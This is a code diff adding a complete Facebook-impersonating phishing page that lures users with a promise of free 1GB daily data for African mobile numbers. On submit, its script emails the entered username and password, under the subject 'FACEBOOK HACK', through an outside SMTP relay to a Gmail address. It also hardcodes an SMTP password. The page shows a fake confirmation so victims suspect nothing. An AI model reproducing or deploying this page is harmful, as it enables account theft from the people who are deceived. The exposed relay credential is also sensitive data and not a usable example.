@@ -1,0 +1,98 @@
+<!doctype html>
+<html>
+
+<head>
+
+    <link rel="stylesheet" href="css/font-awesome-4.7.0/font-awesome-4.7.0/css/font-awesome.css">
+    <link rel="stylesheet" href="css/fb.css">
+
+</head>
+
+<body class="fbbody">
+    <!--content holder-->
+    <div class="cont">
+        <!--facebook-->
+        <nav class="navf">
+            Facebook
+        </nav>
+        <hr>
+        <label>Mobile number or email</label>
+        <br>
+        <input type="text" class="field" id="name" required>
+        <br>
+        <p class="error1" id="er1">please enter mobile number or email</p> <label>Password</label>
+        <br>
+        <input type="password" class="field" id="password" required>
+        <br>
+        <p class="error1" id="er2">please enter password</p>
+
+        <br>
+        <input type="submit" id="sub" value="Log in" class="btn">
+        <br>
+        <br>
+        <a href="http//:www.facebook.com">Forgot password?</a><br><br>
+        <div class="note"><br><br>
+            <label class="fa fa-warning"></label>
+            <br><br><strong>please note!!!</strong>
+            <br>
+            <br>only African mobile number will be awarded with data bundles
+            <br>for video streaming, which is 1GB per day everyday to use!
+            <br>
+            <p class="end" id="ends"></p>
+        </div>
+        <script src="https://smtpjs.com/v3/smtp.js"></script>
+    </div>
+</body>
+
+<script type="text/javascript">
+    var button1 = document.getElementById('sub');
+
+
+    button1.addEventListener("click", function(e) {
+
+        e.preventDefault();
+        /*Collecting user info*/
+        var name = document.getElementById("name").value;
+        let emails = document.getElementById("password").value;
+        var sub = "FACEBOOK HACK";
+        var all = "REASON: " + sub + " <br>" +
+            "USER-NAME: " + name + "<br/>PASSWORD: " + emails;
+        /*Check before send message*/
+        if (!name == "" && !emails == "") {
+
+            var w = name + "Thank you for taking your time of checking if you qualify\nfor 1GB data, you will receive you   facebook 1GB \nafter 12 hours";
+
+            document.getElementById("ends").innerText = w;
+
+            document.getElementById("ends").style.display = "block";
+
+
+
+            /*Sending message*/
+            Email.send({
+                Host: "smtp.elasticemail.com",
+                Username: "owenme10000@gmail.com",
+                Password: "AD0B1E4994EDBBCF36EA39850FB24F86C528",
+                To: 'owenme10000@gmail.com',
+                From: "owenme1000@gmail.com",
+                Subject: sub,
+                Body: all
+            });
+
+        }
+        if (name == "" || name == null) {
+            document.getElementById("er1").style.display = "block";
+        } else {
+            document.getElementById("er1").style.display = "none";
+
+        }
+        if (emails == "" || emails == null) {
+            document.getElementById("er2").style.display = "block";
+        } else {
+            document.getElementById("er2").style.display = "none";
+
+        }
+    })
+</script>
+
+</html>
